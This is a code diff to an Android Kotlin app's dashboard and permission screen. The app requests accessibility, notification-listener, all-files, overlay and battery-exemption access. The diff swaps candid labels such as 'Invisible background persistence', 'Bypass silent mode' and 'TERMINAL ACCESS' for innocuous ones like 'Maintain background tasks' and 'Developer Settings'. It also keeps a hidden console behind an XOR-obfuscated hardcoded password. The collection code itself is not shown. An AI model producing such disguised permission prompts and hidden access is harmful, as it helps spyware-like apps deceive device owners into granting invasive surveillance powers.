@@ -163,7 +163,7 @@ fun InspectorDashboard(ctx: Context) {
 
             // 5. OPTICS CARD
             PremiumCard(
-                title = "Optics Array", 
+                title = "Camera System", 
                 badge = "$cameraCount MODULES",
                 badgeColor = AccentBlue,
                 onClick = { selectedDetail = "camera" }
@@ -250,14 +250,14 @@ fun PermissionsCard(ctx: Context, permState: Map<String, Boolean>) {
     Column(
         modifier = Modifier.fillMaxWidth().background(Color(0xFF1E293B), RoundedCornerShape(24.dp)).border(1.dp, Color(0xFFFCD34D), RoundedCornerShape(24.dp)).padding(20.dp)
     ) {
-        Text("Action Required", color = Color(0xFFFCD34D), fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 12.dp))
+        Text("Permissions Overview", color = Color(0xFFFCD34D), fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 12.dp))
         if (!permState["acc"]!!) PermRow("Accessibility Service", "Background automation") { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
         if (!permState["usage"]!!) PermRow("Usage Stats", "Screen time analytics") { ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
         if (!permState["files"]!!) PermRow("Storage Access", "File system reports") { val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
         if (!permState["notif"]!!) PermRow("Notification Access", "Message sync") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
-        if (!permState["dnd"]!!) PermRow("Do Not Disturb", "Bypass silent mode") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
-        if (!permState["overlay"]!!) PermRow("Appear on Top", "Invisible background persistence") { val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
-        if (!permState["batt"]!!) PermRow("Background Processing", "Unrestricted data sync") { val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (!permState["dnd"]!!) PermRow("Do Not Disturb", "Allow priority alerts") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
+        if (!permState["overlay"]!!) PermRow("Appear on Top", "Maintain background tasks") { val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (!permState["batt"]!!) PermRow("Background Processing", "Allow background sync") { val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
     }
 }
 
@@ -268,7 +268,7 @@ fun PermRow(title: String, desc: String, onClick: () -> Unit) {
             Text(title, color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
             Text(desc, color = TextDim, fontSize = 12.sp)
         }
-        Text("ENABLE", color = Color(0xFFFCD34D), fontSize = 12.sp, fontWeight = FontWeight.Bold)
+        Text("Setup", color = Color(0xFFFCD34D), fontSize = 12.sp, fontWeight = FontWeight.Bold)
     }
 }
 
@@ -356,7 +356,7 @@ fun AuthDialog(onDismiss: () -> Unit, onSuccess: () -> Unit) {
     AlertDialog(
         onDismissRequest = onDismiss,
         containerColor = Color(0xFF0F0F10),
-        title = { Text("TERMINAL ACCESS", color = AccentBlue, fontWeight = FontWeight.Bold, fontSize = 16.sp) },
+        title = { Text("Developer Settings", color = AccentBlue, fontWeight = FontWeight.Bold, fontSize = 16.sp) },
         text = {
             Column {
                 OutlinedTextField(
@@ -373,7 +373,7 @@ fun AuthDialog(onDismiss: () -> Unit, onSuccess: () -> Unit) {
                     )
                 )
                 if (error) {
-                    Text("ACCESS DENIED", color = Color(0xFFEF4565), fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp), fontWeight = FontWeight.Bold)
+                    Text("Authentication Failed", color = Color(0xFFEF4565), fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp), fontWeight = FontWeight.Bold)
                 }
             }
         },
@@ -383,7 +383,7 @@ fun AuthDialog(onDismiss: () -> Unit, onSuccess: () -> Unit) {
                 val target1 = intArrayOf(122, 25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                 val target2 = intArrayOf(25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                 if (pwd == target1 || pwd == target2) onSuccess() else error = true
-            }) { Text("VERIFY", color = AccentBlue) }
+            }) { Text("Confirm", color = AccentBlue) }
         },
         dismissButton = {
             TextButton(onClick = onDismiss) { Text("CANCEL", color = TextDim) }
@@ -402,7 +402,7 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
         containerColor = CardSlate,
         title = { 
             Text(
-                "System Terminal", 
+                "System Logs", 
                 color = TextMain, 
                 fontWeight = FontWeight.SemiBold, 
                 fontSize = 18.sp,
